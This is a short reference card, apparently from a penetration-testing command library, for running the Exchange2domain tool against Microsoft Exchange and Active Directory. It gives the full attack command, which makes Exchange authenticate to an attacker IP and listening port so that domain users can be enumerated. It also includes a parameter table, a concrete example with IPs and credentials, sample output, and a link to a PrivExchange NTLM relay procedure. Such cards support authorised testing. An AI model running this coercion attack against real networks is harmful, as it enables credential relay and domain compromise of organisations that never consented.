---
id: 7a0abf01-e157-4a08-9a74-9f78f07be3f4
name: exchange2domain-run-full-enumeration
type: command
executor: bash
data: >-
  python Exchange2domain.py -ah $_ATTACKER_IP -ap $_LISTEN_PORT -u $_USERNAME -p
  $_PASSWORD -d $_DOMAIN -th $_DC_IP $_MAIL_SERVER_IP
output: null
created_at: '2023-04-06T03:56:08.023276+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Linux
tags:
  - enumeration
  - active-directory
verified: true
validated: true
---

# exchange2domain-run-full-enumeration

## Command

```bash
python Exchange2domain.py -ah $_ATTACKER_IP -ap $_LISTEN_PORT -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -th $_DC_IP $_MAIL_SERVER_IP
```

## Description

Runs Exchange2domain in full mode to enumerate all domain users by coercing Exchange authentications and listening for connections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ah $_ATTACKER_IP | Attacker IP | Yes |
| -ap $_LISTEN_PORT | Listen port (e.g., 9001) | Yes |
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |
| -d $_DOMAIN | Domain | Yes |
| -th $_DC_IP | DC IP | Yes |
| $_MAIL_SERVER_IP | Mail server IP/hostname | Yes |

## Examples

### Basic Usage

```bash
python Exchange2domain.py -ah 192.168.1.100 -ap 9001 -u user -p pass -d domain.local -th 10.0.0.1 mail01.domain.local
```

## Expected Output

[*] Listening on 0.0.0.0:9001
[*] Enumerating users via Exchange coercion
User1: details
User2: details

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
